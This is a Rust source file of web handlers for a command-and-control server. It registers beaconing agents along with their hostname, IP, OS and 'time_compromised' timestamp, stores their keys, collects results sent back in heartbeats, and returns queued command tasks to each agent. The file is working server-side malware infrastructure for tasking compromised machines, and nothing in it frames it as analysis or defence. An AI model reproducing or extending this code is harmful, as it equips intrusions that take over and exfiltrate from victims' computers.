use std::sync::Arc;
use tokio::sync::Mutex;
use uuid::Uuid;
use actix_web::{HttpResponse, Responder, web};

use crate::communication::message::{AgentMessage, ServerMessage};
use crate::core::c2::C2;
use crate::utils::logging::Logging;


pub async fn _handle_session(msg: web::Json<AgentMessage>, _c2: web::Data<Arc<Mutex<C2>>>) -> impl Responder {
    println!("Received: {:?}", msg);

    // Example: just send a default Ack for testing
    let response = match &*msg {
        AgentMessage::Beacon { hostname, ip, os, .. } => {
            println!("New beacon from {} ({} - {})", hostname, ip, os);
            ServerMessage::Ack {
                agent_id: 1, // in real impl, generate/store
                session_id: "init".to_string(),
                status: "registered".to_string()
            }
        }
        AgentMessage::Heartbeat { agent_id, session_id, result } => {
            println!("Heartbeat from {} [{}]: {:?}", agent_id, session_id, result);
            ServerMessage::Noop {
                agent_id: *agent_id,
                session_id: session_id.clone(),
            }
        }
        AgentMessage::Disconnect { agent_id, session_id } => {
            println!("Agent {} disconnected", agent_id);
            ServerMessage::Disconnect {
                agent_id: *agent_id,
                session_id: session_id.clone(),
            }
        }
        AgentMessage::Reconnect { agent_id, session_id } => {
            println!("Agent {} reconnected", agent_id);
            ServerMessage::Ack {
                agent_id: *agent_id,
                session_id: session_id.clone(),
                status: "reconnected".to_string(),
            }
        }
    };

    HttpResponse::Ok().json(response)
}

pub async fn handle_beacon(msg: web::Json<AgentMessage>, c2: web::Data<Arc<Mutex<C2>>>) -> impl Responder {
    println!("Received: {:?}", msg);

    match &*msg {
        AgentMessage::Beacon { 
            hostname, ip, os, time_compromised, key 
        } => {
            // Create/register the agent in the C2
            let mut c2 = c2.lock().await;
            let session = Uuid::new_v4().to_string();
            let agent_id = c2.create_agent(&ip, &hostname, &os, &time_compromised, &session).await;

            // Handle key storage
            let _ = crate::utils::utils::save_key(agent_id, &key);

            // Respond to the agent with an Ack (includes its agent ID and session info)
            let ack = ServerMessage::Ack {
                agent_id,
                session_id: session,
                status: "Registered".to_string(),
            };

            return HttpResponse::Ok().json(ack);
            //return HttpResponse::Ok().body("deserializing working");
        }
        _ => { return HttpResponse::BadRequest().body("Invalid message type"); }
    }
    
}

pub async fn handle_heartbeat(msg: web::Json<AgentMessage>, c2: web::Data<Arc<Mutex<C2>>>) -> impl Responder {
    println!("Received: {:?}", msg);

    match &*msg {
        AgentMessage::Heartbeat { 
            agent_id, session_id, result 
        } => {
            let (valid_session, _agent_id_copy) = {
                let c2 = c2.lock().await;
                (c2.check_session(session_id).await, *agent_id)
            };

            if valid_session {
                if let Some(res) = result {
                    {
                        let c2 = c2.lock().await;
                        c2.update_result(*agent_id, res.clone()).await;
                    }
                    Logging::SUCCESS.print_message(&format!("Received data from Agent {}", agent_id));
                } else { dbg!("No results returned from heartbeat"); }

                let tasks_opt = {
                    let c2 = c2.lock().await;
                    c2.get_tasks(*agent_id).await
                };

                match tasks_opt {
                    Some(tasks) => {
                        let num = tasks.len();
                        let task = ServerMessage::Task {
                            agent_id: *agent_id,
                            session_id: session_id.clone(),
                            command: tasks,
                        };

                        Logging::INFO.print_message(
                            &format!("[+] Received Heartbeat from Agent {} and sent {} tasks", agent_id, num)
                        );

                        return HttpResponse::Ok().json(task);
                    }
                    None => {
                        let noop = ServerMessage::Noop {
                            agent_id: *agent_id,
                            session_id: session_id.clone(),
                        };

                        Logging::INFO.print_message(
                            &format!("[+] Received Heartbeat from Agent {}", agent_id)
                        );

                        return HttpResponse::Ok().json(noop);
                    }
                }
            }

            HttpResponse::BadRequest().body("Invalid session ID")
        }
        _ => HttpResponse::BadRequest().body("Invalid message type"),
    }

}

pub async fn handle_disconnect(msg: web::Json<AgentMessage>, c2: web::Data<Arc<Mutex<C2>>>) -> impl Responder {
    println!("Received: {:?}", msg);

    match &*msg {
        AgentMessage::Disconnect { 
            agent_id, session_id 
        } => {
            // Remove agent from C2
            let mut c2 = c2.lock().await;
            if c2.check_session(&session_id).await {
                c2.remove_agent(*agent_id).await;
            }

            HttpResponse::Ok().body("Removed agent")
        }
        _ => HttpResponse::BadRequest().body("Invalid message type")
    }
}

pub async fn handle_reconnect(msg: web::Json<AgentMessage>, c2: web::Data<Arc<Mutex<C2>>>) -> impl Responder {
    println!("Received: {:?}", msg);

    match &*msg {
        AgentMessage::Reconnect { 
            agent_id, session_id 
        } => {
            let (valid_session, agent_id_copy) = {
                let c2 = c2.lock().await;
                (c2.check_session(session_id).await, *agent_id)
            };

            if valid_session {
                // agent_id should stay the same, but session id should change
                let c2 = c2.lock().await;
                c2.update_agent_time(agent_id_copy).await;

                let new_session = Uuid::new_v4().to_string();
                c2.update_agent_session(agent_id_copy, &new_session).await;

                let ack = ServerMessage::Ack {
                    agent_id: agent_id_copy,
                    session_id: new_session,
                    status: "Reconnected".to_string(),
                };

                return HttpResponse::Ok().json(ack);
            }

            HttpResponse::BadRequest().body("Invalid session ID")
        }
        _ => HttpResponse::BadRequest().body("Invalid message type")
    }

}

pub async fn handle_other(_msg: web::Json<AgentMessage>, _c2: web::Data<Arc<Mutex<C2>>>) -> impl Responder {
    HttpResponse::BadRequest().body("Invalid message type")
}
